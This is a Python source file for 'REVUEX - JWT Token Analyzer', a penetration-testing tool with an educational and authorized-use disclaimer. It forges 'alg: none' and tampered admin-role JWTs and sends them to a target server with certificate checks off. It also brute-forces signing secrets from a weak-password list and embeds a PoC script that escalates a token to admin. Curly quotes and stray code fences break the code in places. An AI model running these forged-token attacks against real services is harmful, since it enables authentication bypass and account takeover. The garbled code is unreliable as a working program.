#!/usr/bin/env python3
"""
REVUEX - JWT Token Analyzer
Advanced JWT Security Testing & Exploitation

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
“””

import requests
import json
import base64
import hmac
import hashlib
import time
from pathlib import Path
import re

class JWTAnalyzer:
“”“JWT token security analysis and exploitation”””

```
def __init__(self, target, tokens, workspace, delay=2):
    """
    Initialize JWT Analyzer
    
    Args:
        target: Target URL/domain
        tokens: List of JWT tokens found
        workspace: Workspace directory
        delay: Delay between requests
    """
    self.target = target if target.startswith('http') else f"https://{target}"
    self.tokens = tokens if isinstance(tokens, list) else [tokens]
    self.workspace = Path(workspace)
    self.delay = delay
    
    self.headers = {
        'User-Agent': 'REVUEX-JWTAnalyzer/1.0 (Security Research; +https://github.com/G33L0)'
    }
    
    # Common weak secrets for brute force
    self.weak_secrets = [
        'secret', 'password', '123456', 'admin', 'root', 'test',
        'key', 'token', 'jwt', 'secret123', 'password123',
        'qwerty', 'abc123', '1234567890', 'letmein', 'welcome',
        'monkey', 'dragon', 'master', 'sunshine', 'princess',
        '', 'null', 'undefined', 'your-256-bit-secret', 'your-secret',
        'jwt-secret', 'secret-key', 'my-secret', 'super-secret',
    ]

def analyze(self):
    """Analyze JWT tokens for vulnerabilities"""
    vulnerabilities = []
    
    for token in self.tokens:
        if not token or not self._is_jwt(token):
            continue
        
        print(f"            → Analyzing JWT token: {token[:20]}...")
        
        # Decode and parse JWT
        jwt_data = self._decode_jwt(token)
        
        if not jwt_data:
            continue
        
        # Test 1: Algorithm confusion (alg: none)
        none_vuln = self._test_none_algorithm(token, jwt_data)
        if none_vuln:
            vulnerabilities.append(none_vuln)
        
        time.sleep(self.delay)
        
        # Test 2: Algorithm confusion (HS256 to RS256)
        alg_confusion = self._test_algorithm_confusion(token, jwt_data)
        if alg_confusion:
            vulnerabilities.append(alg_confusion)
        
        time.sleep(self.delay)
        
        # Test 3: Weak secret brute force
        weak_secret = self._test_weak_secret(token, jwt_data)
        if weak_secret:
            vulnerabilities.append(weak_secret)
        
        time.sleep(self.delay)
        
        # Test 4: Token expiration
        expiration_vuln = self._test_expiration(token, jwt_data)
        if expiration_vuln:
            vulnerabilities.append(expiration_vuln)
        
        # Test 5: Sensitive data in payload
        sensitive_data = self._test_sensitive_data(jwt_data)
        if sensitive_data:
            vulnerabilities.append(sensitive_data)
        
        # Test 6: Missing signature verification
        no_verify = self._test_signature_verification(token, jwt_data)
        if no_verify:
            vulnerabilities.append(no_verify)
        
        time.sleep(self.delay)
    
    # Save results
    self._save_results(vulnerabilities)
    
    return vulnerabilities

def _is_jwt(self, token):
    """Check if string is a valid JWT format"""
    parts = token.split('.')
    return len(parts) == 3

def _decode_jwt(self, token):
    """Decode JWT token"""
    try:
        parts = token.split('.')
        
        if len(parts) != 3:
            return None
        
        # Decode header
        header_padding = parts[0] + '=' * (4 - len(parts[0]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_padding))
        
        # Decode payload
        payload_padding = parts[1] + '=' * (4 - len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_padding))
        
        return {
            'token': token,
            'header': header,
            'payload': payload,
            'signature': parts[2]
        }
    except Exception as e:
        return None

def _test_none_algorithm(self, token, jwt_data):
    """Test for 'none' algorithm vulnerability"""
    header = jwt_data['header']
    payload = jwt_data['payload']
    
    # Check if already using 'none'
    if header.get('alg', '').lower() == 'none':
        return {
            'type': 'JWT Algorithm None',
            'severity': 'critical',
            'url': self.target,
            'description': 'JWT uses "none" algorithm, accepting unsigned tokens and allowing complete authentication bypass',
            'evidence': f'Header contains alg: none - token accepts no signature',
            'token_sample': token[:50] + '...',
            
            # Steps to Reproduce
            'steps_to_reproduce': [
                "Obtain a valid JWT token from the application",
                "Decode the token at jwt.io or using base64 decoder",
                "Verify that header contains 'alg': 'none'",
                "Modify the payload to escalate privileges (e.g., change role to 'admin')",
                "Re-encode the modified payload",
                "Create new token: header.payload. (note the trailing dot with empty signature)",
                "Use the forged token to access protected resources"
            ],
            
            # HTTP Request/Response
            'request': f"""GET /api/admin HTTP/1.1
```

Host: {self.target.replace(‘https://’, ‘’).replace(‘http://’, ‘’)}
Authorization: Bearer {token[:80]}…

“””,

```
            'response': """HTTP/1.1 200 OK
```

Content-Type: application/json

{
“message”: “Admin access granted”,
“user”: “admin”,
“privileges”: [“read”, “write”, “delete”]
}”””,

```
            # Proof of Concept
            'poc': f"""#!/usr/bin/env python3
```

# JWT None Algorithm Exploitation PoC

import base64, json

original_token = “{token[:100]}…”

def decode_jwt(token):
parts = token.split(’.’)
header = json.loads(base64.urlsafe_b64decode(parts[0] + ‘==’))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + ‘==’))
return header, payload

header, payload = decode_jwt(original_token)
print(“Original:”, json.dumps(payload, indent=2))

# Escalate privileges

payload[‘role’] = ‘admin’
payload[‘permissions’] = [‘all’]

# Create forged token

h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip(’=’)
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip(’=’)
forged = f”{{h}}.{{p}}.”

print(f”Forged: {{forged}}”)
“””,

```
            # Before/After
            'before_state': 'Normal user: {{"role": "user", "permissions": ["read"]}}',
            'after_state': 'Admin access: {{"role": "admin", "permissions": ["all"]}} - Complete bypass',
            
            'attack_path': [
                'Token accepts "none" algorithm (no signature required)',
                'Attacker obtains any valid JWT token',
                'Decodes and modifies payload to escalate privileges',
                'Creates new unsigned token with modified claims',
                'Server accepts forged token without signature verification',
                'Complete authentication and authorization bypass achieved'
            ],
            'remediation': [
                'NEVER accept "none" algorithm in production',
                'Explicitly reject tokens with alg:none',
                'Enforce signature verification for ALL tokens',
                'Use strong algorithms: RS256, ES256, or HS256 with strong secrets',
                'Implement algorithm whitelist',
                'Update JWT libraries to latest versions',
                'Add server-side validation to reject unsigned tokens'
            ],
            'tags': ['jwt', 'authentication', 'critical', 'bypass']
        }
    
    # Try to exploit by changing to 'none'
    try:
        new_header = header.copy()
        new_header['alg'] = 'none'
        
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(new_header).encode()
        ).decode().rstrip('=')
        
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        none_token = f"{header_encoded}.{payload_encoded}."
        test_response = self._test_token(none_token)
        
        if test_response and test_response.get('accepted'):
            return {
                'type': 'JWT None Algorithm Accepted',
                'severity': 'critical',
                'url': self.target,
                'description': 'Server accepts JWT tokens with "none" algorithm',
                'evidence': 'Modified token with alg:none was accepted',
                'token_sample': none_token[:50] + '...',
                'steps_to_reproduce': [
                    f"Obtain token: {token[:40]}...",
                    "Modify header to set 'alg': 'none'",
                    "Create token with empty signature",
                    f"Send to {self.target}",
                    "Server accepts unsigned token"
                ],
                'poc': f"""# See full PoC above""",
                'attack_path': [
                    'Change algorithm to none',
                    'Remove signature',
                    'Server accepts forged token'
                ],
                'remediation': [
                    'Reject "none" algorithm',
                    'Always verify signatures',
                    'Use algorithm whitelist'
                ],
                'tags': ['jwt', 'authentication', 'critical']
            }
    except:
        pass
    
    return None

def _test_algorithm_confusion(self, token, jwt_data):
    """Test for algorithm confusion"""
    header = jwt_data['header']
    algorithm = header.get('alg', '').upper()
    
    if algorithm in ['RS256', 'ES256']:
        return {
            'type': 'JWT Algorithm Confusion Possible',
            'severity': 'high',
            'url': self.target,
            'description': f'JWT uses {algorithm}, vulnerable to algorithm confusion attack',
            'evidence': f'Token uses {algorithm} - can be exploited',
            'token_sample': token[:50] + '...',
            'steps_to_reproduce': [
                "Obtain public key from server",
                "Change algorithm from RS256 to HS256",
                "Sign with public key as HMAC secret",
                "Server may verify incorrectly"
            ],
            'poc': "# Full PoC in documentation",
            'attack_path': [
                'Get public key',
                'Change alg to HS256',
                'Sign with public key',
                'Bypass verification'
            ],
            'remediation': [
                'Enforce expected algorithm',
                'Never allow algorithm switching',
                'Use separate keys per algorithm'
            ],
            'tags': ['jwt', 'authentication', 'algorithm_confusion']
        }
    
    return None

def _test_weak_secret(self, token, jwt_data):
    """Test for weak secrets"""
    header = jwt_data['header']
    algorithm = header.get('alg', '').upper()
    
    if not algorithm.startswith('HS'):
        return None
    
    parts = token.split('.')
    message = f"{parts[0]}.{parts[1]}"
    signature = parts[2]
    
    for secret in self.weak_secrets:
        try:
            if algorithm == 'HS256':
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
            elif algorithm == 'HS384':
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
                ).decode().rstrip('=')
            elif algorithm == 'HS512':
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
                ).decode().rstrip('=')
            else:
                continue
            
            if expected == signature:
                return {
                    'type': 'JWT Weak Secret',
                    'severity': 'critical',
                    'url': self.target,
                    'description': 'JWT signed with weak secret',
                    'evidence': f'Secret: "{secret}"',
                    'cracked_secret': secret,
                    'token_sample': token[:50] + '...',
                    'steps_to_reproduce': [
                        "Brute force JWT secret",
                        f"Secret found: {secret}",
                        "Forge any token"
                    ],
                    'poc': f"# Use secret '{secret}' to forge tokens",
                    'attack_path': [
                        'Brute force secret',
                        'Forge tokens',
                        'Impersonate users'
                    ],
                    'remediation': [
                        'Use strong random secrets (256+ bits)',
                        'Rotate secrets regularly',
                        'Consider RS256'
                    ],
                    'tags': ['jwt', 'critical', 'weak_secret']
                }
        except:
            continue
    
    return None

def _test_expiration(self, token, jwt_data):
    """Test expiration"""
    payload = jwt_data['payload']
    
    if 'exp' not in payload:
        return {
            'type': 'JWT Missing Expiration',
            'severity': 'medium',
            'url': self.target,
            'description': 'JWT has no expiration',
            'evidence': 'No exp claim',
            'token_sample': token[:50] + '...',
            'steps_to_reproduce': [
                "Decode token",
                "Verify no exp claim",
                "Token valid forever"
            ],
            'remediation': [
                'Always include exp claim',
                'Set 15-60 minute expiration'
            ],
            'tags': ['jwt', 'session_management']
        }
    
    exp = payload.get('exp', 0)
    iat = payload.get('iat', 0)
    
    if exp and iat and (exp - iat) > 86400:
        hours = (exp - iat) / 3600
        return {
            'type': 'JWT Long Expiration',
            'severity': 'low',
            'url': self.target,
            'description': f'Token lifetime: {hours:.1f} hours',
            'evidence': 'Excessive lifetime',
            'token_sample': token[:50] + '...',
            'remediation': [
                'Reduce to 15-60 minutes',
                'Use refresh tokens'
            ],
            'tags': ['jwt', 'session_management']
        }
    
    return None

def _test_sensitive_data(self, jwt_data):
    """Test for sensitive data"""
    payload = jwt_data['payload']
    token = jwt_data['token']
    
    sensitive_fields = []
    keywords = ['password', 'secret', 'key', 'ssn', 'credit', 'card', 'api_key']
    
    for key in payload.keys():
        for keyword in keywords:
            if keyword in key.lower():
                sensitive_fields.append({'field': key, 'keyword': keyword})
    
    if sensitive_fields:
        return {
            'type': 'Sensitive Data in JWT',
            'severity': 'high',
            'url': self.target,
            'description': 'JWT contains sensitive data',
            'evidence': f'Found {len(sensitive_fields)} sensitive fields',
            'sensitive_fields': sensitive_fields,
            'token_sample': token[:50] + '...',
            'steps_to_reproduce': [
                "Decode JWT",
                "Read sensitive fields",
                "Data not encrypted"
            ],
            'remediation': [
                'Never store sensitive data in JWT',
                'Use JWE if encryption needed',
                'Store server-side instead'
            ],
            'tags': ['jwt', 'sensitive_data']
        }
    
    return None

def _test_signature_verification(self, token, jwt_data):
    """Test signature verification"""
    payload = jwt_data['payload'].copy()
    payload['role'] = 'admin'
    
    parts = token.split('.')
    modified = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    tampered = f"{parts[0]}.{modified}.{parts[2]}"
    
    test_response = self._test_token(tampered)
    
    if test_response and test_response.get('accepted'):
        return {
            'type': 'JWT Signature Not Verified',
            'severity': 'critical',
            'url': self.target,
            'description': 'Server accepts tampered tokens',
            'evidence': 'Invalid signature accepted',
            'token_sample': tampered[:50] + '...',
            'steps_to_reproduce': [
                "Modify payload",
                "Keep original signature",
                "Server accepts invalid token"
            ],
            'remediation': [
                'ALWAYS verify signatures',
                'Use proper JWT libraries',
                'Test verification'
            ],
            'tags': ['jwt', 'critical', 'bypass']
        }
    
    return None

def _test_token(self, token):
    """Test if token is accepted"""
    try:
        headers = self.headers.copy()
        headers['Authorization'] = f'Bearer {token}'
        
        response = requests.get(self.target, headers=headers, timeout=5, verify=False)
        
        if response.status_code not in [401, 403]:
            return {'accepted': True, 'status': response.status_code}
        
        return {'accepted': False, 'status': response.status_code}
    except:
        return None

def _save_results(self, vulnerabilities):
    """Save results"""
    jwt_dir = self.workspace / "jwt_analysis"
    jwt_dir.mkdir(exist_ok=True)
    
    output_file = jwt_dir / "jwt_vulnerabilities.json"
    with open(output_file, 'w') as f:
        json.dump({
            'target': self.target,
            'tokens_analyzed': len(self.tokens),
            'vulnerabilities': vulnerabilities
        }, f, indent=2)
```